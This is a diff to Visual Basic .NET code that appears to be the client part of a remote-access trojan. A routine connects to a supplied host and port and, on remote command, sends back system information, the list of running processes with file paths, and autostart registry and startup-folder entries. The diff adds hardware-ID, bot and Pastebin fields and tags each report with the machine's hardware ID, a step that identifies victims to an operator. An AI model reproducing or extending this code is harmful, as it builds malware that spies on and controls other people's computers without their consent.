@@ -6,7 +6,7 @@ Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         KEY = K
         HOST = H
@@ -14,6 +14,9 @@ Public Class Main
         SPL = SP
         PASS = PW
         FULLPATH = FP
+        HWID = HW
+        BOT = BT
+        Pastebin = PB
 
         Dim lp As Integer = 0
 
@@ -38,7 +41,7 @@ Public Class Main
             lp = 0
             C.Client.Connect(H, P)
             CN = True
-            Send("SysInfo" + SPL + ID.Getsystem)
+            Send("SysInfo" + SPL + ID.Getsystem + SPL + HWID)
         Catch ex As Exception
         End Try
         GoTo re
@@ -102,7 +105,7 @@ cc:
         Try
             Select Case A(0)
                 Case "Sysinfo"
-                    Send("SysInfo" + SPL + ID.Getsystem)
+                    Send("SysInfo" + SPL + ID.Getsystem + SPL + HWID)
 
                 Case "PROC"
                     Dim PR As String = String.Empty
@@ -110,7 +113,7 @@ cc:
                     For Each P As Process In PR_LIST
                         Try : PR += P.ProcessName & "|'P'|" & P.Id & "|'P'|" & P.MainModule.FileName & "|'P'|" : Catch : End Try ' file |'p'| 1 |'p'| c:/file.exe |'p'|
                     Next
-                    Send("PROC" + SPL + PR + SPL + Windows.Forms.Application.ExecutablePath)
+                    Send("PROC" + SPL + PR + SPL + Windows.Forms.Application.ExecutablePath + SPL + HWID)
 
                 Case "STUP" 'credit ĦΔĆҜƗŇǤ ŞØØƒ
 
@@ -241,7 +244,7 @@ cc:
                         STARTUP += IO.Path.GetFileName(F) + "|'P'|" + F + "|'P'|"
                     Next
 
-                    Send("STUP" + SPL + HKEY_CURRENT_USER_Run + SPL + HKEY_CURRENT_USER_RunOnce + SPL + HKEY_CURRENT_USER_Policies + SPL + LOCAL_MACHINE_Run + SPL + LOCAL_MACHINE_Policies + SPL + LOCAL_MACHINE_RunOnce + SPL + STARTUP + SPL + LOCAL_MACHINE_WOW6432Node)
+                    Send("STUP" + SPL + HKEY_CURRENT_USER_Run + SPL + HKEY_CURRENT_USER_RunOnce + SPL + HKEY_CURRENT_USER_Policies + SPL + LOCAL_MACHINE_Run + SPL + LOCAL_MACHINE_Policies + SPL + LOCAL_MACHINE_RunOnce + SPL + STARTUP + SPL + LOCAL_MACHINE_WOW6432Node + SPL + HWID)
 
 
                 Case "Close"
@@ -340,5 +343,8 @@ cc:
     Public Shared PASS As String
     Public Shared M As New IO.MemoryStream
     Public Shared FULLPATH As String
+    Public Shared HWID As String
+    Public Shared BOT As String
+    Public Shared Pastebin As String
 
 End Class
